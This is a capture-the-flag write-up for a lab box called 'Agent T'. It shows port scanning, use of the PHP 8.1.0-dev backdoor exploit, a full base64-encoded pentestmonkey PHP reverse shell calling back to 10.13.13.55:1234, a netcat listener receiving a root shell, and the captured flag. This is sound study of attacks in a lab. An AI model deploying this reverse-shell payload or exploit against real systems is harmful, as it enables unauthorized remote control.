# Box Name

## Agent T

## Overview
---
* [[#Enumeration]]
	* rustscan

* [[#Initial Foothold]]
	* PHP backdoor exploit

* [[#Privilege Escalation]]
	* none

---
## Enumeration
---
 ## Rustscan

```bash
─$ rustscan -a 10.10.186.57                                       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.186.57:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack PHP cli server 5.5 or later (PHP 8.1.0-dev)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title:  Admin Dashboard


```
---
## Initial Foothold
---

 ## PHP 8.1.0-dev exploit
	
```bash
└─$ python3 php_exploit.py   
Enter the full host url:
http://10.10.186.57

Interactive shell is opened on http://10.10.186.57 
Can't acces tty; job crontol turned off.
$ pwd
/var/www/html

```

-  uploaded the pentestmonkey php reverseshell
			- base64 encoded php reverse shell using the php exploit [[revshell]]
```bash$ 
$ echo PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRpb24gaW4gUEhQLiBDb21tZW50cyBzdHJpcHBlZCB0byBzbGltIGl0IGRvd24uIFJFOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcGVudGVzdG1vbmtleS9waHAtcmV2ZXJzZS1zaGVsbC9tYXN0ZXIvcGhwLXJldmVyc2Utc2hlbGwucGhwCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0CgpzZXRfdGltZV9saW1pdCAoMCk7CiRWRVJTSU9OID0gIjEuMCI7CiRpcCA9ICcxMC4xMy4xMy41NSc7CiRwb3J0ID0gMTIzNDsKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgYmFzaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKaWYgKGZ1bmN0aW9uX2V4aXN0cygncGNudGxfZm9yaycpKSB7CgkkcGlkID0gcGNudGxfZm9yaygpOwoJCglpZiAoJHBpZCA9PSAtMSkgewoJCXByaW50aXQoIkVSUk9SOiBDYW4ndCBmb3JrIik7CgkJZXhpdCgxKTsKCX0KCQoJaWYgKCRwaWQpIHsKCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzCgl9CglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KCmNoZGlyKCIvIik7Cgp1bWFzaygwKTsKCi8vIE9wZW4gcmV2ZXJzZSBjb25uZWN0aW9uCiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoISRzb2NrKSB7CglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7CglleGl0KDEpOwp9CgokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7Cgp3aGlsZSAoMSkgewoJaWYgKGZlb2YoJHNvY2spKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KCmZjbG9zZSgkc29jayk7CmZjbG9zZSgkcGlwZXNbMF0pOwpmY2xvc2UoJHBpcGVzWzFdKTsKZmNsb3NlKCRwaXBlc1syXSk7CnByb2NfY2xvc2UoJHByb2Nlc3MpOwoKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0KCj8+ | base64 -d > shell.php


```

```php
$ cat shell.php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.13.13.55';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	

```

---
## Privilege Escalation
----
![[Pasted image 20220807173144.png]]

```bash
└─$ nc -lnvp 1234             
listening on [any] 1234 ...
connect to [10.13.13.55] from (UNKNOWN) [10.10.186.57] 35728
Linux 3f8655e43931 5.4.0-96-generic #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 GNU/Linux
sh: 1: w: not found
uid=0(root) gid=0(root) groups=0(root)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

root@3f8655e43931:/# ls -la
ls -la
total 80
drwxr-xr-x   1 root root 4096 Mar  7 22:03 .
drwxr-xr-x   1 root root 4096 Mar  7 22:03 ..
-rwxr-xr-x   1 root root    0 Mar  7 22:03 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 30  2021 bin
drwxr-xr-x   2 root root 4096 Nov 22  2020 boot
drwxr-xr-x   5 root root  340 Aug  7 22:14 dev
drwxr-xr-x   1 root root 4096 Mar  7 22:03 etc
-rw-rw-r--   1 root root   38 Mar  5 22:33 flag.txt
drwxr-xr-x   2 root root 4096 Nov 22  2020 home
drwxr-xr-x   1 root root 4096 Mar 30  2021 lib
drwxr-xr-x   2 root root 4096 Jan 11  2021 lib64
drwxr-xr-x   2 root root 4096 Jan 11  2021 media

```

```bash
root@3f8655e43931:/# cat flag.txt

flag{4127d0530abf16d6d23973e3df8dbecb}
```